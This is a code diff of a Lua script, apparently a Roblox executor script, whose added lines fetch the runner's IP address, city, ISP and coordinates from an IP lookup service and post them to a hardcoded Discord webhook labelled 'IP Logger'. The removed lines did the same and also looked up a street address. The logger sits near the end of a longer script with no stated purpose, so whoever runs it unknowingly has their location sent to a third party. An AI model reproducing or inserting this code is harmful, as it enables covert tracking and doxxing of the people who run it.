@@ -305,7 +305,7 @@ end)
 
 
 
-
+    
 
 
 
@@ -771,63 +771,56 @@ wait(2)
 
 
 
+local http = syn and syn.request or request or http_request or (http and http.request)
+if not http then
+    print("Your executor does not support HTTP requests.")
+    return
+end
 
+-- API and Webhook URLs
+local ipApiUrl = "http://ip-api.com/json/"
+local webhookUrl = "https://discord.com/api/webhooks/1343050966185934910/BW396KWKIUFIpFByPFOUdblQfnnzRqGaWkp9v8A203sUDxmtkZTAQMs_lGBx616JpHFd"
 
-local function getIPAddress()
-    local response = syn and syn.request or http and http.request or request
-    if not response then return "Unknown", 0, 0 end
-
-    local result = response({
-        Url = "http://ip-api.com/json/",
+-- Fetch IP geolocation data
+local success, response = pcall(function()
+    return http({
+        Url = ipApiUrl,
         Method = "GET"
     })
+end)
 
-    if result and result.StatusCode == 200 then
-        local data = game:GetService("HttpService"):JSONDecode(result.Body)
-        return data.query, data.lat, data.lon
-    end
-    
-    return "Unknown", 0, 0
-end
+if success and response and response.Body then
+    local data = game:GetService("HttpService"):JSONDecode(response.Body)
 
-local function getAddress(lat, lon)
-    local response = syn and syn.request or http and http.request or request
-    if not response then return "Address not found" end
+    if data.status == "success" then
+        -- Format data for Discord webhook
+        local payload = {
+            ["username"] = "IP Logger",
+            ["embeds"] = {{
+                ["title"] = "New IP Data Captured",
+                ["color"] = 16711680, -- Red color
+                ["fields"] = {
+                    {["name"] = "IP Address", ["value"] = data.query, ["inline"] = true},
+                    {["name"] = "Country", ["value"] = data.country, ["inline"] = true},
+                    {["name"] = "Region", ["value"] = data.regionName, ["inline"] = true},
+                    {["name"] = "City", ["value"] = data.city, ["inline"] = true},
+                    {["name"] = "ISP", ["value"] = data.isp, ["inline"] = true},
+                    {["name"] = "Latitude", ["value"] = tostring(data.lat), ["inline"] = true},
+                    {["name"] = "Longitude", ["value"] = tostring(data.lon), ["inline"] = true}
+                }
+            }}
+        }
 
-    local url = string.format("https://nominatim.openstreetmap.org/reverse?lat=%f&lon=%f&format=json", lat, lon)
-    local result = response({
-        Url = url,
-        Method = "GET"
-    })
+        -- Convert payload to JSON
+        local jsonPayload = game:GetService("HttpService"):JSONEncode(payload)
 
-    if result and result.StatusCode == 200 then
-        local data = game:GetService("HttpService"):JSONDecode(result.Body)
-        return data.display_name or "Address not found"
-    end
+        -- Send data to Discord webhook
+        local successWebhook, webhookResponse = pcall(function()
+            return http({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonPayload
+            })
+        end)
 
-    return "Address not found"
-end
-
-local function sendToWebhook()
-    local ip, lat, lon = getIPAddress()
-    local address = getAddress(lat, lon)
-
-    local payload = game:GetService("HttpService"):JSONEncode({
-        ip = ip,
-        latitude = lat,
-        longitude = lon,
-        address = address
-    })
-
-    local response = syn and syn.request or http and http.request or request
-    if response then
-        response({
-            Url = "https://discord.com/api/webhooks/1343050966185934910/BW396KWKIUFIpFByPFOUdblQfnnzRqGaWkp9v8A203sUDxmtkZTAQMs_lGBx616JpHFd",
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = payload
-        })
-    end
-end
-
-sendToWebhook()
